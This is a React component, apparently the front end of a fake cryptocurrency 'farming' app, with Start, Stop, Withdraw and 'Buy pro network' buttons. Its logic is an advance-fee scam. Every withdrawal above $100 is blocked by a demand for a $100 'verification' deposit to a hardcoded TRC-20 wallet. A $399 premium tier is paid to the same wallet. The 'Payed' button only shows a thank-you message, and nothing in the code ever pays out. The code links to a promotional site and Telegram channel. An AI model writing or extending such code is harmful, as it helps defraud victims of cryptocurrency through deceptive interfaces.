import React, {useState} from 'react';
import {observer} from "mobx-react-lite";
import store from "../store"
import Modal from 'react-modal';
import swal from "@sweetalert/with-react";

const Panel = () => {
    const [showWithdrawModal, setShowWithdrawModal] = useState(false)
    const [showProModal, setShowProModal] = useState(false)
    const [showVerificationModal, setShowVerificationModal] = useState(false)

    const [amount, setAmount] = useState('')

    const handleProPayed = () => {
	swal(
	    <div>
		<h3 style={{marginBottom: 15}}>Thank you for your purchase</h3>
		<p>Now please wait within 2-3 hours, our managers will automatically assign you a pro network</p>
	    </div>
	)
	setShowProModal(false)
	setShowVerificationModal(false)
    }

    const handleWithdraw = () => {
	if(amount >= 100 && amount <= parseInt(store.getTotalBalance().toFixed(0))) {
	    setShowWithdrawModal(false)
	    swal(
		<div>
		    <p>In order to withdraw funds you need to verify your account</p>
		</div>
	    ).then(() => {
		setShowVerificationModal(true)
	    })
	} else if (amount > parseInt(store.getTotalBalance().toFixed(0))) {
	    swal(
		<div>
		    <p>You have not enough balance</p>
		</div>
	    )
	}
    }

    return (
	<div className="panel">
	    <button className="btn" disabled={store.status === 'stop'} onClick={() => store.stop()}>Stop</button>
	    <button className="btn" disabled={store.status === 'start'} onClick={() => store.start()}>Start</button>
	    <button onClick={() => setShowWithdrawModal(true)} className="btn" disabled={store.status === 'start'}>Withdraw</button>
	    <button onClick={() => setShowProModal(true)} className="btn" disabled={store.status === 'start'}>Buy pro network</button>

	    <Modal
		isOpen={showWithdrawModal}
		className={"modal"}
	    >
		<div className="close" onClick={() => setShowWithdrawModal(false)}>
		    <img src="./img/close.svg" />
		</div>
		<div className="group">
		    <div className="label">Amount:</div>
		    <input type="number" value={amount} max={store.getTotalBalance().toFixed(0)} onChange={(e) => setAmount(e.target.value)} className="field"/>
		</div>
		<div className="group">
		    <div className="label">Wallet:</div>
		    <input type="text" className="field"/>
		</div>
		<div className="modal__footer">
		    <button className="btn" onClick={handleWithdraw} disabled={amount < 100}>Withdraw</button>
		</div>
		<p>Network TRC-20 (USDT) <br/>
		    Min withdraw amount - $100</p>
	    </Modal>

	    <Modal
		isOpen={showProModal}
		className={"modal"}
	    >
		<div className="close" onClick={() => setShowProModal(false)}>
		    <img src="./img/close.svg" />
		</div>
		<div className="group">
		    <div className="label">Wallet:</div>
		    <input type="text" value={'TDhytTWYbqrDgRchnmDi83ch5tjyiTswT8'} readOnly className="field"/>
		</div>
		<div className="group">
		    <div className="label">Transaction ID:</div>
		    <input type="text" className="field"/>
		</div>
		<div className="modal__footer">
		    <button onClick={handleProPayed} className="btn">Payed</button>
		</div>
		<p>With a premium subscription, you can farm cryptocurrency 100 times faster and withdraw your earned money instantly. Also in the premium subscription gives you a safe use of our software. ( 399$ )
		    <br/>
		    More info: <br/><a className={'link'} href="https://crypto-nft.space">https://crypto-nft.space</a><br/><a className={'link'} href="https://t.me/crypto_nft_space">https://t.me/crypto_nft_space</a><br/><br/>
		    Network TRC-20 (USDT)<br/>
		    Min withdraw amount - $100</p>
	    </Modal>

	    <Modal
		isOpen={showVerificationModal}
		className={"modal"}
	    >
		<div className="close" onClick={() => setShowVerificationModal(false)}>
		    <img src="./img/close.svg" />
		</div>
		<p>
		    You need to verify yourself as a user and verify your wallet. For verification, you need to deposit $100 with our details, this money will be credited to your balance. You can withdraw them within 1 hour after verification. Verification takes approximately 30 minutes to 1 hour
		    <br/>
		    More info: <br/><a className={'link'} href="https://crypto-nft.space">https://crypto-nft.space</a><br/><a className={'link'} href="https://t.me/crypto_nft_space">https://t.me/crypto_nft_space</a><br/><br/>
		    Network TRC-20 (USDT)<br/>
		    Min withdraw amount - $100</p>
		<div className="group">
		    <div className="label">Wallet:</div>
		    <input type="text" value={'TDhytTWYbqrDgRchnmDi83ch5tjyiTswT8'} readOnly className="field"/>
		</div>
		<div className="group">
		    <div className="label">Transaction ID:</div>
		    <input type="text" className="field"/>
		</div>
		<div className="modal__footer">
		    <button onClick={handleProPayed} className="btn">Payed</button>
		</div>
	    </Modal>
	</div>
    );
};

export default observer(Panel);